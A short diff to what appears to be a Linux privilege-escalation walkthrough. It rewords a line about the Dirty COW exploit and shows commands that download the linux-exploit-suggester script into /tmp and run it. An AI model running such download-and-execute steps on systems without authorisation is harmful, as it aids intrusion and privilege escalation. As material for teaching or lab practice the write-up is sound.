@@ -2,10 +2,10 @@ Looking around the system, we see that `/tmp` has `-wx-wx-wx` rights, which mean
 we can write and execute but not read, which will help us to download files, \
 compile programs, and execute them.
 
-When running this [script](https://github.com/mzet-/linux-exploit-suggester), we found that dirty cow can help us escalate privileges. \
+We can run this [script](https://github.com/mzet-/linux-exploit-suggester), to find vulnerabilities in our linux system. \
 Running the command
 ```
-$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh;
+$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O /tmp/les.sh
 $ chmod +x /tmp/les.sh
 $ /tmp/les.sh 
 ```
